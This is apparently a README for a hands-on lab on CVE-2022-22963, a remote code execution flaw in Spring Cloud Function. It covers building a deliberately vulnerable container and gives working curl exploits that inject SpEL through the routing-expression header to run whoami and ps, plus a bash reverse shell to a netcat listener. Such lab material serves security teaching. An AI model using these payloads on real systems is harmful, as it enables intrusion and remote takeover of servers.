# CVE-2022-22963 - Spring Cloud Function RCE Workshop

A vulnerable Spring Boot application demonstrating CVE-2022-22963, a critical Remote Code Execution vulnerability in Spring Cloud Function versions 3.0.0 through 3.2.2.

It has logic in place to show the contents of /tmp inside the container browsable to allow you to write command outputs or files to /tmp and view the output easily at http://localhost:8080/result

## What is CVE-2022-22963?

Spring Cloud Function allows routing HTTP requests via the `spring.cloud.function.routing-expression` header. In vulnerable versions, this header is evaluated as a Spring Expression Language (SpEL) expression without proper sanitization, allowing attackers to execute arbitrary code.

**CVSS Score:** 9.8 (Critical)
**Affected Versions:** Spring Cloud Function 3.0.0 - 3.2.2
**Patched Version:** 3.2.3+

---

## Setup

### Build and Run the Vulnerable Container

```bash
# Build the Docker image
docker build -t vuln-spring .

# Run the container (we add the host.docker.internal so it can communicate back to the host for a reverse shell)
docker run -p 8080:8080 --add-host=host.docker.internal:host-gateway --name vuln-app vuln-spring

# Verify it's running
curl http://localhost:8080/
```

Expected output: `Vulnerable Spring Cloud Function Demo - CVE-2022-22963`

---

## Exploitation

### 1. Test Vulnerability - Execute `whoami`

```bash
curl -X POST http://127.0.0.1:8080/functionRouter \
  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash -c whoami>/tmp/whoami.txt")' \
  --data 'Never gonna give you up'
```

**Note:** Check the http://localhost:8080/result page and you should see a whoami.txt file you can open to see the results

### 2. Show Processes

```bash
curl -X POST http://127.0.0.1:8080/functionRouter \
  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","ps aux>/tmp/ps.txt"})' \
  -d 'Never gonna let you down'
```

**Note:** Check the http://localhost:8080/result page and you should see a ps.txt file you can open to see the results

### 3. Reverse Shell

**Attacker Machine - Start Listener:**
```bash
nc -lvnp 4444
```

**Note:** The above command needs to be run on a machine accessable from the target machine/container.

```bash
# Simple bash reverse shell
curl -X POST http://127.0.0.1:8080/functionRouter \
  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","bash -i >& /dev/tcp/host.docker.internal/4444 0>&1"})' \
  --data 'Never gonna run around and desert you'
```

## Educational Use Only

This workshop is for educational and authorized security testing purposes only. Do not use these techniques against systems you don't own or have explicit permission to test.

---

## References

- [CVE-2022-22963 NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2022-22963)
- [Spring Cloud Function Security Advisory](https://spring.io/security/cve-2022-22963)
